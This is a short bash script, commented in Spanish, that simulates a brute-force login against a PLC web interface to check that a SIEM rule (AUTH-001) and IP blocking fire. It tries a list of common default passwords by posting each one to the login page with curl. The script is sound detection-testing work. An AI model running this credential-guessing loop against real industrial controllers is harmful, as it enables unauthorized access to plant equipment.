#!/bin/bash
# Simulación de acceso no autorizado a PLC (brute force)
# Objetivo: Verificar detección de AUTH-001 y bloqueo IP

TARGET_IP="${1:-192.168.50.10}"
PLC_PORT="8080"

echo "[+] Iniciando simulación de brute force contra PLC web"
echo "[+] Target: $TARGET_IP:$PLC_PORT"

# Intentos de login con credenciales comunes
PASSWORDS=("admin" "password" "123456" "openplc" "root" "plc123")

for pass in "${PASSWORDS[@]}"; do
    echo "[*] Probando: admin:$pass"
    curl -s -X POST "http://$TARGET_IP:$PLC_PORT/login" \
        -d "username=admin&password=$pass" \
        -w "HTTP %{http_code}\n" -o /dev/null 2>/dev/null || echo "    [!] Conexión fallida"
    sleep 1
done

echo "[✓] Simulación completa"
echo "[!] Verificar alerta AUTH-001 (Multiple Failed Login Attempts) en SIEM"
